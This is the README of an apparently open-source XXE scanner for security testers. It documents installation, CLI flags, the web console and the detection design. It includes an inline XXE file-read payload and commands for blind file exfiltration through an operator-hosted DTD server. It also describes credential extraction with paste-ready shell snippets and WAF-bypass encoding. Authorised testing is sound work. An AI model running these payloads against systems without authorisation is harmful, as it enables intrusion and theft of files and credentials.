# XXERipper

**A standalone, black-box XML External Entity (XXE) scanner for security professionals.**

XXERipper detects in-band, error-based, and blind out-of-band XXE across 30+ attack technique families. It combines statistical baselining, differential parser fingerprinting, out-of-band confirmation via `interactsh-client` (manual or automatic), a browser-based console, WAF-bypass encoding, end-to-end exploit-chain detection, credential extraction with paste-ready shell snippets, CWE-mapped findings, and JSON / SARIF / HTML output for CI/CD and reporting.

[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
[![Version](https://img.shields.io/badge/version-1.0.0-green.svg)](https://github.com/kamalx06/XXERipper/releases)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/kamalx06/XXERipper/pulls)

---

## Table of Contents

- [Overview](#overview)
- [Key Features](#key-features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
- [Command-Line Reference](#command-line-reference)
- [Web Console](#web-console)
- [Architecture and Design](#architecture-and-design)
- [Fingerprinting Methodology](#fingerprinting-methodology)
- [Detection Methodology](#detection-methodology)
- [Accuracy Engine](#accuracy-engine)
- [Attack Techniques](#attack-techniques)
- [Exploit Chains and Loot Extraction](#exploit-chains-and-loot-extraction)
- [Out-of-Band Confirmation](#out-of-band-confirmation)
- [WAF Bypass Encoding](#waf-bypass-encoding)
- [Custom Payloads](#custom-payloads)
- [Output Formats](#output-formats)
- [Reliability and Coverage](#reliability-and-coverage)
- [CI/CD Integration](#cicd-integration)
- [Testing Against the Included Labs](#testing-against-the-included-labs)
- [Building, License, and Credits](#building-license-and-credits)

---

## Overview

XXERipper is a self-contained CLI and browser-console scanner for XML External Entity injection, designed for penetration testers, bug-bounty hunters, and security researchers who need accurate, low-false-positive detection of a vulnerability class that is easy to test badly and hard to test well.

It is deliberately minimal — `httpx` and (for the console) `flask`, nothing else — and end-to-end auditable. Every phase can be traced, every finding carries an evidence trail, every skipped technique is reported with a reason, and every extracted file or credential is deduplicated and stored with paste-ready exploitation snippets.

XXERipper does not exploit the target beyond the entity-resolution primitive itself. It determines whether a parser resolves external entities, whether the result can be observed in-band, via parser errors, or out of band, and reports that determination with a confidence score, a CWE mapping, and — when a full chain completes — a rollup finding that names the end-to-end impact.

---

## Key Features

- **30+ attack technique families** across in-band, error-based, blind, encoding-bypass, alternative-sink, extended-fetcher, cloud-metadata, RCE-wrapper, Office-document, and YAML-deserialization classes.
- **End-to-end exploit-chain detection.** A `ChainTracker` observes every finding, derives chain stages from ID + evidence, and fires a rollup finding when a template completes — `XXE → IMDS → IAM credentials → AWS account takeover`, `XXE → SSH private key → lateral movement`, `XXE → Kubernetes secrets → cluster credential theft`, and ten more.
- **Loot store with credential extraction across seven kinds.** Every file-read finding routes through a universal extractor that pulls the raw file content out of the response, stores it deduplicated, and scans it for AWS IAM blobs, AWS CLI credentials, Alibaba RAM credentials, SSH private keys, GCP service accounts, OAuth access tokens (GCP metadata and Azure managed identity), Kubernetes service-account tokens, and generic bearer tokens. Each credential carries paste-ready shell snippets — `aws sts get-caller-identity`, `aliyun sts GetCallerIdentity`, `ssh -i …`, `gcloud auth activate-service-account`, `kubectl --token=…`, and `curl -H 'Authorization: Bearer …'` — built with the token's real claims where applicable.
- **Differential parser fingerprinting** across 11 XML stacks (libxml2, Xerces, .NET, Java SAX/StAX, Python stdlib, PHP DOM, Ruby, Node.js, Perl, Go), with paired test/control probes and an on-disk per-URL cache.
- **Statistical baselining** — median, IQR, p95, mode status, and windowed Shannon entropy — with graded vetoes that reject noise without suppressing real findings.
- **Out-of-band confirmation** via `interactsh-client`. Two modes: **manual** (scanner prints every subdomain, you watch the client) and **auto** (`--oob-auto` spawns `interactsh-client` and correlates callbacks in-process). Both embed a unique 16-hex token per payload so callbacks can never be misattributed.
- **Blind file exfiltration** — the scanner serves the DTD that causes the target to send file content into the callback, extracts the exfiltrated payload, and routes it through the same loot pipeline as in-band reads. Three DTD-hosting options: a built-in HTTP server (`--oob-listen`), a directory served by your own web server (`--oob-dtd-dir`), or the WebUI's own Flask routes (tick *Serve DTDs from this WebUI* in the drawer).
- **Cloud-metadata chain detection** as a first-class phase: AWS IMDSv1/v2 (including IMDSv2 detection), GCP, Azure, Alibaba, Oracle, and the Kubernetes service-account API. A response containing credential markers is promoted to CRITICAL and probed no further.
- **XXE-to-RCE protocol wrappers**: `jar://`, `data://`, `phar://`, `glob://`, `compress.zlib://`.
- **Office-document XSLT invocation** (`XXE-OFFICE-XSLT-{DOCX,XLSX}`) — an `xml-stylesheet` PI inside a Word or Excel part causes server-side document processors to fetch an attacker-controlled XSLT.
- **Unsafe YAML deserialization** — CWE-502, probed alongside XML through the same endpoints via PyYAML and SnakeYAML payloads.
- **JSON-to-XML content-type switching** — catches Spring MVC with `jackson-dataformat-xml` on the classpath, which silently accepts `application/xml` on any `@RequestBody` endpoint.
- **SAML pre-signature XXE** — parses the assertion body before signature verification, the sequence that CVE-2026-28809 (esaml) exposed.
- **WAF-bypass phase** (`--bypass-waf`) — re-sends the entire payload catalogue through fifteen encoders across three families. Runs *after* the core phases so a direct hit is found in ~20 requests instead of being buried behind ~1,500 encoded ones.
- **HTTP/2 negotiation** — the session builder speaks HTTP/2 via ALPN and falls back silently to HTTP/1.1.
- **Multi-indicator fingerprinting** — no single string match triggers a finding.
- **Per-phase exception isolation** — a crash in one technique family cannot lose findings from phases already completed.
- **Web console** (`--serve`) — browser-based workbench with live event streaming, command palette, keyboard-driven navigation, per-job JSON / SARIF / HTML downloads, and a separate **View HTML** button that opens the report inline instead of downloading it. Zero-dependency frontend: one self-contained HTML file, no CDN.
- **CWE-mapped findings** emitted in JSON, SARIF v2.1.0, and a self-contained printable HTML report.
- **Coverage reporting** — every phase that did not run is listed with a reason, so "clean" is never confused with "incomplete."
- **Pre-auth replay** — `--pre-auth-request FILE` replays Burp-format requests and merges their `Set-Cookie` before the scan starts, so multi-step auth flows work without a cookies file.
- **Rate limiting, retry with backoff, and a wall-clock budget** to prevent accidental DoS.

---

## Installation

### PyPI (recommended)

```bash
pip install xxeripper
pip install "xxeripper[socks]"    # plus SOCKS proxy support
```

The base install pulls in `httpx[http2]` (with HTTP/2 negotiation
enabled via ALPN) and `Flask` (used by the `--serve` web console).
SOCKS proxy support is the only optional extra. HTTP/2 is a required
feature, not an optional one — it lives in the main dependency list as
`httpx[http2]`. The `xxeripper[http2]` extra is provided purely for
user habit; installing it is equivalent to installing the base package.

### Distribution packages

```bash
yay -S xxeripper                                    # Arch AUR — release
yay -S xxeripper-git                                # Arch AUR — latest git
sudo dpkg -i xxeripper_1.0.0_amd64.deb              # Debian / Ubuntu
sudo dnf install xxeripper-1.0.0-1.noarch.rpm       # Fedora / RHEL
```

### From source

```bash
git clone https://github.com/kamalx06/XXERipper.git
cd XXERipper && pip install -e ".[socks]"
```

### Requirements

- **Python 3.9 through 3.14.**
- **`httpx[http2]` ≥ 0.27, < 0.29** — the HTTP client. HTTP/2 support
  is pulled in via the `[http2]` extra of `httpx`, which brings the
  `h2` dependency with it. The scanner negotiates HTTP/2 via ALPN on
  the TLS handshake and silently falls back to HTTP/1.1 where the
  server doesn't support it.
- **`Flask` ≥ 3.0, < 4.0** — used by the `--serve` web console. It is
  a main dependency, not an optional one; the console is a first-class
  interface, and `xxeripper --serve` is documented in
  [Quick Start](#quick-start) and [Web Console](#web-console).
- **Optional:** `PySocks` ≥ 1.7.1 for SOCKS proxies
  (`xxeripper[socks]`).
- **Optional:** `interactsh-client` in `PATH` for automatic OOB
  confirmation (`--oob-auto`). Manual OOB mode (`--oob-domain`) has no
  external dependency — you run `interactsh-client` yourself in a
  separate terminal.

The wheel ships a single file, `xxeripper.py`. There is no package
directory, no compiled extension, and no build step at install time.
The CLI entry point is declared as `xxeripper = "xxeripper:main"`, so
`pip install xxeripper` puts an `xxeripper` executable on your `PATH`.

### Optional extras

| Extra | Pulls in | When to install |
|---|---|---|
| `xxeripper[socks]` | `PySocks` ≥ 1.7.1 | You scan through a SOCKS5 proxy, including Tor via `socks5h://` |
| `xxeripper[http2]` | *(nothing new)* | Never strictly needed — the base install already includes `httpx[http2]`. Provided for user habit |

There is no `[webui]` extra — Flask is a main dependency, and the
console works out of the box on any base install.

---

## Quick Start

```bash
# 1. Basic scan (in-band and error-based, no OOB)
xxeripper https://target.com/api/xml

# 2. Terminal A: start interactsh-client and note the session domain
interactsh-client -v
# [INF] c5f2a9b4e1d8a3f72c0b.oast.pro

# 3. Terminal B: scan with OOB payloads under that domain
xxeripper https://target.com/api/xml \
    --oob-domain c5f2a9b4e1d8a3f72c0b.oast.pro

# 4. Match the [OOB] lines from the scanner against callbacks in Terminal A

# 5. Or skip the two-terminal dance: let the scanner spawn and drive
#    interactsh-client itself
xxeripper https://target.com/api/xml --oob-auto

# 6. Blind file exfiltration with the built-in DTD server
xxeripper https://target.com/api/xml \
    --oob-auto --oob-listen 0.0.0.0:8888 \
    --oob-public-url http://your-public-ip:8888

# 7. Launch the browser-based console instead of a CLI scan
xxeripper --serve
# [*] XXE-Ripper web console
# [*]   URL:  http://127.0.0.1:8080

# 8. Write a self-contained HTML report
xxeripper https://target.com/api/xml --report-html report.html

# 9. CI usage: write SARIF and fail the build on HIGH+ findings
xxeripper https://target.com/api/xml \
    -o results.sarif --format sarif --fail-on high
```

The scanner handles baseline capture, parser fingerprinting, payload generation, execution, scoring, chain rollup, credential extraction, and reporting. Blind confirmation is available either as a two-terminal workflow (manual mode, the default) or as a fully-automated subprocess-driven workflow (`--oob-auto`).

---

## Usage

```bash
# Authenticated scan
xxeripper https://target.com/api/xml --cookie "SESSION=...; csrf=abc"
xxeripper https://target.com/api/xml --cookie-file cookies.txt

# Multi-step auth: replay a login first, then scan with the resulting session
xxeripper https://target.com/api/xml \
    --pre-auth-request login.burp --pre-auth-request csrf.burp

# Burp request ingestion
xxeripper -r request.txt --oob-domain c5f2a9b4e1d8a3f72c0b.oast.pro

# Automatic OOB (spawns interactsh-client, correlates callbacks in-process)
xxeripper -r request.txt --oob-auto

# Blind exfiltration with the built-in DTD server
xxeripper https://target.com/api/xml \
    --oob-auto \
    --oob-listen 0.0.0.0:8888 \
    --oob-public-url http://198.51.100.7:8888

# Blind exfiltration with a directory served by your own web server
xxeripper https://target.com/api/xml \
    --oob-auto \
    --oob-dtd-dir /var/www/dtds \
    --oob-dtd-url-prefix http://198.51.100.7:8000/dtds

# Custom payloads (inline, file, directory)
xxeripper https://target.com/api/xml \
    --payload '<!DOCTYPE x [<!ENTITY e SYSTEM "file://{FILE}">]><x>&e;</x>' \
    --payload-file ./my_payloads.xml --payload-dir ./custom_xxe/ \
    --oob-domain c5f2a9b4e1d8a3f72c0b.oast.pro

# Rate-limited batch scan
xxeripper -u targets.txt -o results.json \
    --oob-domain c5f2a9b4e1d8a3f72c0b.oast.pro --rate 5 --threads 10

# Extended file-target scan
xxeripper https://target.com/api/xml --full-file-scan

# Force upload-shaped phases on a target whose URL does not hint at it
xxeripper https://target.com/ingest --svg \
    --oob-domain c5f2a9b4e1d8a3f72c0b.oast.pro

# Force the SAML pre-signature phase on a non-SAML-shaped URL
xxeripper https://target.com/auth/assert --saml --oob-auto

# WAF bypass: re-send the entire catalogue through every encoder
xxeripper https://target.com/api/xml --bypass-waf all --oob-auto

# WAF bypass: pick specific encoders
xxeripper https://target.com/api/xml \
    --bypass-waf utf16be,utf32le,ucs4_2143,b64_uri --oob-auto

# Start the web console instead of a CLI scan
xxeripper --serve --port 8080

# Both JSON and SARIF output, plus a printable HTML report
xxeripper https://target.com/api/xml \
    -o results --format both --report-html results.html

# Full combination
xxeripper -r request.txt --cookie "extra=token" --payload-dir ./payloads/ \
    --oob-auto --timing --unsafe --svg --saml --full-file-scan \
    --bypass-waf utf16be,ebcdic,ucs4_2143 \
    --oob-dtd-dir /var/www/dtds --oob-dtd-url-prefix http://198.51.100.7:8000/dtds \
    --threads 20 --rate 8 --timeout-read 20 --budget 1800 \
    --proxy socks5://127.0.0.1:9050 --debug \
    -o results --format both --report-html report.html
```

---

## Command-Line Reference

### Target and output

| Option | Description |
|---|---|
| `url` (positional) | Single URL to scan |
| `-u, --urls FILE` | File with URLs, one per line |
| `-r, --request FILE` | Raw HTTP request in Burp format |
| `-o, --output FILE` | Results output file |
| `--format {json,sarif,both}` | Output format. Default: `json` |
| `--report-html PATH` | Write a self-contained HTML report after the scan |
| `--fail-on {critical,high,medium,low,never}` | Exit with code `2` when a finding at or above this severity is present. Default: `never` |
| `--debug` | Verbose diagnostic output |

### Out-of-band

| Option | Description |
|---|---|
| `--oob-domain SESSION_DOMAIN` | **Manual mode.** Interactsh-client session domain. The scanner builds payloads under this domain and prints each subdomain in the target's summary. It does not poll — watch your `interactsh-client` terminal. Mutually exclusive with `--oob-auto` |
| `--oob-auto` | **Auto mode.** Spawn `interactsh-client` as a subprocess, extract the session domain from its JSON output, and correlate callbacks in-process. Requires `interactsh-client` in `PATH`. Mutually exclusive with `--oob-domain` |
| `--oob-timeout SECONDS` | Per-poll OOB wait budget. Only meaningful with `--oob-auto`; combining it with `--oob-domain` is an argument error, since manual mode never waits. Default: `8.0` |

### Blind exfiltration

| Option | Description |
|---|---|
| `--oob-listen HOST:PORT` | Bind a built-in HTTP server that serves DTD payloads. Requires `--oob-public-url`. Use `0.0.0.0:PORT` to bind all interfaces |
| `--oob-public-url URL` | Public URL prefix for the built-in DTD server (e.g. `http://198.51.100.7:8888`). Required with `--oob-listen` |
| `--oob-dtd-dir PATH` | Alternative to `--oob-listen`: a directory the scanner writes DTD files to. Serve it from your own web server. Requires `--oob-dtd-url-prefix` |
| `--oob-dtd-url-prefix URL` | Public URL prefix that maps to `--oob-dtd-dir` (e.g. `http://198.51.100.7:8000/dtds`) |

The two modes are mutually exclusive in practice: use `--oob-listen` when the target can reach the scanner's address, and `--oob-dtd-dir` when you control a public-facing web server. Manual OOB mode (`--oob-domain`) does not support exfiltration — the scanner never reads interactsh's output in manual mode, so the exfiltrated content must be read from the operator's terminal.

### Web console

| Option | Description |
|---|---|
| `--serve` | Start the browser-based console instead of running a CLI scan |
| `--host ADDRESS` | Bind address for the console. Default: `127.0.0.1`. The startup banner warns against non-loopback binds |
| `--port PORT` | Bind port for the console. Default: `8080` |

### Fingerprint and file targeting

| Option | Description |
|---|---|
| `--no-fingerprint` | Skip the parser fingerprint phase. Capability gating is disabled; all phases run unconditionally |
| `--no-fingerprint-cache` | Disable the on-disk fingerprint cache; forces a fresh probe |
| `--full-file-scan` | Iterate the full Linux + Windows file-target list (~58 paths) instead of the priority subset (~21 paths) |

### Cookies and payloads

| Option | Description |
|---|---|
| `--cookie STRING` / `--cookie-file FILE` | Inline cookies or Netscape jar / `key=value` file |
| `--no-cookie-merge` | Skip `Set-Cookie` merging |
| `--pre-auth-request FILE` | Replay a Burp-format request once before the scan. `Set-Cookie` headers from the response are merged into the scanner's jar. Repeat for multi-step auth |
| `--payload XML` / `--payload-file FILE` / `--payload-dir DIR` | Custom payloads (inline, file, directory) |

### Attack modes

| Option | Description |
|---|---|
| `--timing` | Enable timing-based blind detection |
| `--unsafe` | Enable DoS payloads (Billion Laughs) |
| `--svg` | Force SVG upload and multipart/DOCX/Office-XSLT phases |
| `--saml` | Force the SAML pre-signature phase on endpoints whose URL does not look SAML-shaped |

### WAF bypass

| Option | Description |
|---|---|
| `--bypass-waf [ENCODERS]` | Re-send the entire payload catalogue through the selected encoders *after* the core phases. Pass `all` (or no value) for every encoder, or a comma-separated subset. Valid names: `utf16be`, `utf16le`, `utf16decl`, `utf16nobom`, `utf32be`, `utf32le`, `ebcdic`, `ucs4_2143`, `utf8bom`, `public`, `public_charref`, `b64_uri`, `whitespace_pad`, `doctype_closure`, `pe_stager` |
| `--bypass-waf-include-custom` | Extend the sweep to user-supplied payloads. Only meaningful with `--bypass-waf`. Customs referencing `{CALLBACK}` or `{DOMAIN}` are skipped |

### Network and stability

| Option | Description |
|---|---|
| `--proxy URL` | `http://`, `https://`, `socks5://`, or `socks5h://` |
| `--threads N` | Concurrent targets. Default: 20 |
| `--rate R` | Maximum requests per second per target. Default: unlimited |
| `--timeout-connect SECONDS` / `--timeout-read SECONDS` | Default: 5.0 / 15.0 |
| `--budget SECONDS` | Wall-clock scan limit. Default: 3600 |
| `--verify-tls` | Re-enable certificate verification |

### Custom-payload placeholders

`{FILE}`, `{CALLBACK}`, `{DOMAIN}`, `{URL}`, `{HOST}` — substituted at dispatch time with the current file target, unique callback subdomain, session domain, target URL, and target hostname.

---

## Web Console

The console is a browser-based workbench for running and inspecting scans, served from the same binary via `--serve`.

```bash
xxeripper --serve
# [*] XXE-Ripper web console
# [*]   URL:  http://127.0.0.1:8080
# [*]   127.0.0.1 by default. Do NOT expose to untrusted networks.
# [*]   OOB auto mode available via the WebUI
#         (interactsh-client will be spawned on first use).
```

The console binds to loopback by default and has **no authentication**. Re-binding via `--host` prints an explicit warning; front it with an authenticated reverse proxy if you need remote access.

### Layout

A three-pane workbench:

- **Targets** (left) — every job with its live status, finding count, and severity breakdown.
- **Center** — a tabbed pane:
  - **Findings** — filterable by severity, text-searchable, sortable by severity / ID / title / confidence.
  - **Events** — phase transitions, cancellations, and lifecycle events.
  - **OOB** — dispatch list with per-payload correlation status once callbacks land, plus an `exfiltrated` block under any callback that carried recovered file content.
  - **Loot** — every file and credential recovered from the selected target, with copy buttons for full content and paste-ready shell snippets.
  - **Log** — debug output when enabled.
- **Inspector** (right) — Overview / Evidence / Reasons / Raw sub-tabs for the selected finding. The Overview renders extracted credentials inline with per-command copy buttons. Every value has a copy button.

### Command palette

Press `⌘K` / `Ctrl+K` for fuzzy search across commands, targets, and findings. Findings show their severity as a colored pill in the palette.

### Keyboard shortcuts

| Key | Action |
|---|---|
| `j` / `k` | Next / previous target |
| `n` / `p` | Next / previous finding |
| `/` | Focus the filter |
| `c` | Open the new-scan drawer |
| `r` | Re-run the selected scan |
| `?` | Shortcuts dialog |
| `Esc` | Progressive dismiss (filter → finding → target) |

### New-scan drawer

Full access to every CLI flag from the browser: URL or Burp request, OOB mode (manual domain or auto), the **Blind exfiltration** section with two mutually-exclusive options (WebUI-hosted DTD server plus public URL field, or DTD directory plus URL prefix for external serving), proxy, cookies, rate, budget, timeouts, threads, custom payloads, payload files, pre-auth requests, and the checkbox grid for scan options. The WAF bypass section exposes all fifteen encoders as individual checkboxes plus a "Toggle all" button; both the encoder grid and the include-custom checkbox reset to off whenever the drawer closes, so bypass never carries over silently between scans.

### Auto OOB from the console

Ticking **Auto OOB mode** in the drawer spawns one `interactsh-client` for the lifetime of the server process. It is spawned lazily on the first auto-OOB job and reused thereafter. Multiple concurrent jobs share the session domain but maintain independent token sets, so callbacks remain correctly attributed per target. Incoming callbacks are printed to the server's terminal as they arrive.

### WebUI-hosted DTD server

In addition to the CLI-side DTD hosting options, the WebUI can serve DTDs from its own Flask routes. Tick **Serve DTDs from this WebUI** in the drawer, supply the public URL where the WebUI is reachable, and the scanner will register DTDs at `/dtd/<token>.dtd` on the same Flask process that runs the console. No second terminal, no `python -m http.server`, no separate directory.

This works when the target can reach the address the WebUI is bound to. Bind the console to `0.0.0.0` with a public URL prefix and the WebUI becomes a fully self-contained exfiltration server. When the target is remote and the WebUI is not, use the CLI's `--oob-dtd-dir` mode instead: the scanner writes DTD files to a directory, you serve that directory from nginx or Apache, and the WebUI reads the results back through the same scan process.

### Per-job artifacts

Every completed job has three download buttons in the toolbar:

- **JSON** — byte-identical to `--format json` from the CLI.
- **SARIF** — byte-identical to `--format sarif` from the CLI.
- **HTML** — downloads the self-contained HTML report (uses `Content-Disposition: attachment`).
- **View HTML** — opens the same report inline in a new tab (uses `Content-Disposition: inline`).

Same file, two behaviors, two buttons.

### Cancel support

A running job can be cancelled from the console. Cancellation is cooperative: the job's `ScanContext` is signalled, and every phase checks it before each payload send. A job waiting for a concurrency slot can be cancelled before it ever starts.

---

## Architecture and Design

XXERipper is a single-file orchestrator with a small set of composable components. There is no plugin system, no configuration DSL, no external state beyond the on-disk fingerprint cache.

```
┌─────────────────────────────────────────────────────────────┐
│  Entry points                                               │
│  ─ CLI (argparse)  ─ Web console (Flask + single HTML)      │
└──────────────────────────┬──────────────────────────────────┘
                           │
                ┌──────────▼──────────┐
                │  ScanJob            │
                │  (web)              │
                │  scan_target (cli)  │
                └──────────┬──────────┘
                           │
        ┌──────────────────┼──────────────────┐
        │                  │                  │
   ┌────▼────┐        ┌────▼────┐        ┌────▼────┐
   │Session  │        │Cookie   │        │OOBClient│
   │(httpx,  │        │Manager  │        │/ Inter- │
   │ HTTP/2) │        │         │        │actshMgr │
   └────┬────┘        └─────────┘        └────┬────┘
        │                                     │
        │                              ┌──────▼───────┐
        │                              │DTDServer /   │
        │                              │FileDTDWriter │
        │                              │WebUIDTDServer│
        │                              └──────────────┘
        │
   ┌────▼───────────────────────────────────────────────┐
   │  XXEDetector                                       │
   │                                                    │
   │  1. Baseline capture  (StatisticalBaseline)        │
   │  2. Parser fingerprint (ParserFingerprint, cache)  │
   │  3. Phase execution   (ordered, isolated, budgeted)│
   │                                                    │
   │  ┌────────────┐  ┌────────────┐  ┌──────────────┐  │
   │  │Accuracy    │  │Chain       │  │LootStore /   │  │
   │  │Engine      │◄─┤Tracker     │  │Credential    │  │
   │  │(score, veto│  │(stage      │  │Extractor /   │  │
   │  │ classify)  │  │ rollup)    │  │FileExtractor │  │
   │  └────────────┘  └────────────┘  └──────────────┘  │
   └────────────────────────────────────────────────────┘
                           │
                ┌──────────▼──────────┐
                │  Reporters          │
                │  JSON · SARIF · HTML│
                └─────────────────────┘
```

### Components

| Component | Role |
|---|---|
| `build_session` | Constructs an `httpx.Client` with HTTP/2 negotiation, connection pooling, optional proxy, and per-request header injection |
| `CookieManager` | Merges cookies from inline strings, Netscape jars, `key=value` files, and Burp headers. Optionally absorbs `Set-Cookie` from every response |
| `CustomPayloadLoader` | Loads, splits, and normalizes user payloads from inline strings, files (`---` separator or `<‌?xml` boundaries), and directories |
| `OOBClient` | Generates correlated subdomains, tracks pending tokens, dispatches observations, correlates callbacks against a live `InteractshManager`. Works identically in manual and auto modes |
| `InteractshManager` | Spawns and reads `interactsh-client -json -v`, extracts the session domain, exposes a thread-safe callback list |
| `DTDServer` | Built-in HTTP server for blind-exfiltration DTD payloads. Bound by `--oob-listen`. Serves `<token>.dtd` on demand |
| `FileDTDWriter` | Writes DTD files into a directory the operator serves externally. Paired with `--oob-dtd-url-prefix` |
| `WebUIDTDServer` | Backs the WebUI-hosted DTD route. Registers DTDs in a process-wide dict and returns URLs under `/dtd/<token>.dtd` |
| `OOBExfilExtractor` | Parses interactsh callback objects and extracts exfiltrated data from HTTP request paths/queries and DNS subdomain labels |
| `ParserFingerprint` | Sends paired test/control probes, matches error text against 11 signature families, populates a `capabilities` dict |
| `StatisticalBaseline` | Captures 7 benign samples; computes median length, elapsed, status, body hash, median Shannon entropy, windowed entropy, IQR, p95 |
| `AccuracyEngine` | Scores a candidate response against the baseline, applies vetoes and weights, classifies severity |
| `XXEPayloadGenerator` | Pure functions returning payload strings and bytes for every technique family |
| `XXEDetector` | The orchestrator: builds headers, runs phases, calls the accuracy engine, records findings, drives the loot and chain subsystems |
| `ChainTracker` | Records chain stages derived from finding IDs and evidence; fires rollup findings when templates complete |
| `LootStore` | Thread-safe, deduplicated repository of extracted files and secrets. Persists nothing to disk by default |
| `CredentialExtractor` | Regex-based extraction of AWS IAM JSON and INI, Alibaba RAM, SSH private keys, GCP service accounts, OAuth access tokens, Kubernetes service-account tokens, and generic bearers, each with paste-ready shell snippets |
| `FileContentExtractor` | Type-specific extraction of raw file content from response bodies (`/etc/passwd`, `/etc/shadow`, SSH keys, `.env`, `web.config`, `win.ini`, `system.ini`, `boot.ini`, `/proc` files), with a generic structural fallback |
| `ScanContext` | Wall-clock deadline and cooperative cancellation; every phase checks it before each send |
| `RateLimiter` | Enforces a minimum interval between requests per target; independent of `--threads` |

### Scanning workflow

1. **Pre-flight.** Cookie jar is built. Pre-auth requests (if any) are replayed and their `Set-Cookie` headers merged. Custom payloads are loaded. The `ScanContext` deadline is set.
2. **Baseline capture.** Seven benign `POST` requests are sent. Median length, elapsed time, status code, body hash, entropy, IQR, and p95 are computed.
3. **Fingerprint.** Nine capability probes are run against the target. Error text from the probes is matched against parser signatures. The result is cached on disk (unless `--no-fingerprint-cache`).
4. **Core phases.** In-band file read, JSON-to-XML switching, content-type matrix, method variation, query-parameter injection, SSRF, cloud metadata, RCE wrappers, error-based.
5. **OOB-dependent phases.** DNS-only, external DTD, parameter-entity OOB, CDATA bypass, XInclude variants, XSLT/XSD fetchers, `xml-stylesheet` PI, multipart, DOCX, form-encoded.
6. **Bypass and alternative sinks.** Encoding bypass, XInclude, SVG upload, SAML/SOAP envelope, SAML pre-signature.
7. **Opt-in phases.** Timing-based blind (`--timing`), DoS (`--unsafe`).
8. **Office-document and YAML phases.** `xml-stylesheet` PI in DOCX/XLSX parts, and PyYAML / SnakeYAML deserialization probes.
9. **Custom payloads.** Each user payload is tested against every file target.
10. **WAF bypass (optional).** If `--bypass-waf` is set, the entire payload catalogue is re-sent through every selected encoder. Runs *after* the core phases so a direct hit is found before the encoded sweep.
11. **Chain rollup.** `ChainTracker.emit_rollup_findings()` walks completed templates and emits a rollup finding per completion.
12. **Reporting.** Results are serialized to JSON, SARIF, and/or self-contained HTML.

Every phase runs inside `_run_phase`, which catches any exception, logs the traceback under `--debug`, and continues to the next phase. A finding emitted before a crash cannot be lost.

---

## Fingerprinting Methodology

The fingerprint phase answers two questions: **which XML stack is running**, and **which entity-resolution capabilities does it expose**. Both drive phase selection — a target that rejects DOCTYPE entirely does not need the local-DTD sweep run against it.

### Capability probes

Nine paired probes, each with a test payload and a control payload:

| Capability | Test | Success condition (test passes, control does not) |
|---|---|---|
| `dtd_allowed` | Benign DOCTYPE with an element declaration | `200`, marker string present |
| `dtd_entity_syntax_accepted` | DOCTYPE with an entity declaration (not used) | `200`, marker present |
| `dtd_parsed_but_not_resolved` | DOCTYPE with entity declared and referenced | `200`, raw `&x;` visible (parser kept it unexpanded) |
| `internal_entity` | Internal entity expanded | `200`, marker present, `&x;` absent |
| `external_file` | `SYSTEM "file:///etc/hostname"` | `200`, output looks like a hostname, no markup, no raw entity |
| `parameter_entity` | Internal parameter-entity stager | `200`, `PE_MARKER` present, `&inner;` absent |
| `external_dtd` | `SYSTEM "http://127.0.0.1:1/nonexistent.dtd"` | `5xx`, or `Connection refused` / `Failed to load` / `IO error` present |

The control is the same request with a benign body. A capability is only marked `True` if the test's success predicate passes **and** the control's does not. This is what makes the fingerprint differential rather than pattern-matched — a target that always returns `200 OK` cannot falsely report "DTD allowed."

### Signature matching

Response bodies from the probes (and any `5xx` response body) accumulate into an error text buffer. That buffer is matched against eleven signature families:

| Family | Representative strings |
|---|---|
| `libxml2` | `lxml.etree.XMLSyntaxError`, `xmlParseEntityRef`, `Failed to load external entity`, `Premature end of data in tag` |
| `xerces` | `org.apache.xerces`, `com.sun.org.apache.xerces`, `SAXParseException`, `was referenced, but not declared`, `cvc-elt.` |
| `dotnet` | `System.Xml.XmlException`, `System.Xml.XmlReader`, `An error occurred while parsing EntityName`, `DTD is prohibited` |
| `java_sax` | `org.xml.sax.SAXParseException`, `DocumentBuilder`, `JAXP00010001`, `AccessExternalDTD`, `disallow-doctype-decl` |
| `java_stax` | `javax.xml.stream.XMLStreamException`, `IS_SUPPORTING_EXTERNAL_ENTITIES`, `woodstox`, `com.ctc.wstx` |
| `python_etree` | `xml.etree.ElementTree.ParseError`, `xml.parsers.expat.ExpatError`, `undefined entity`, `not well-formed (invalid token)` |
| `php_libxml` | `Warning: DOMDocument::load`, `SimpleXMLElement::__construct():`, `DOMException:` |
| `ruby` | `REXML::ParseException`, `Nokogiri::XML::SyntaxError`, `The entity expansion has been blocked` |
| `node` | `ExpatError`, `xml2js`, `libxmljs`, `fast-xml-parser`, `Unexpected close tag` |
| `perl` | `XML::LibXML`, `XML::Parser`, `XML::Twig`, `Couldn't parse` |
| `go` | `encoding/xml`, `XML syntax error on line`, `xml: cannot unmarshal` |

The family with the most hits wins. The `libxml2` family is deliberately the largest — lxml's exception classes, the underlying C function names, and libxml2's human-readable diagnostics all count, so a target using lxml is confidently distinguished from one using Python's stdlib `etree` (which is expat and matches the `python_etree` family instead).

### On-disk cache

Fingerprint results are cached at `~/.cache/xxeripper/fingerprints.json`, keyed by target URL. A cached entry stores the winning parser name, the full capabilities dict, and a timestamp. Repeat scans of the same URL skip the probe phase entirely.

The cache is stable between runs unless the target's XML stack changes. In CI, point `HOME` at a persisted cache directory to save the probe requests every run. Delete the file or pass `--no-fingerprint-cache` to invalidate.

### Capability gating

Two phases consume the fingerprint result:

- **In-band file read** — skipped if the fingerprint succeeded and reported no entity-resolution capability across all of `internal_entity`, `external_file`, `external_dtd`, `parameter_entity`, `dtd_allowed`.
- **Error-based local-DTD sweep** — same gate. The malformed-entity sub-technique runs regardless, because it succeeds on stacks (Xerces, .NET) that don't need a local DTD at all.

The gate only fires if the fingerprint *succeeded* (i.e. at least one capability is `True` and there is a winning parser family). A fingerprint that returned all `False` — which happens when the target doesn't parse XML at all — is treated as "unknown" and phases run unconditionally. This avoids the failure mode where a misconfigured fingerprint suppresses real findings.

Pass `--no-fingerprint` to disable the phase and the gate entirely.

---

## Detection Methodology

The detection pipeline is deliberately layered. Each layer is a veto or a weight, and each has a specific failure mode it is designed to prevent.

### Layer 1 — Statistical baseline

Seven benign `POST` requests are sent before any attack payload. From those samples:

- **Median body length** — used for length-delta scoring.
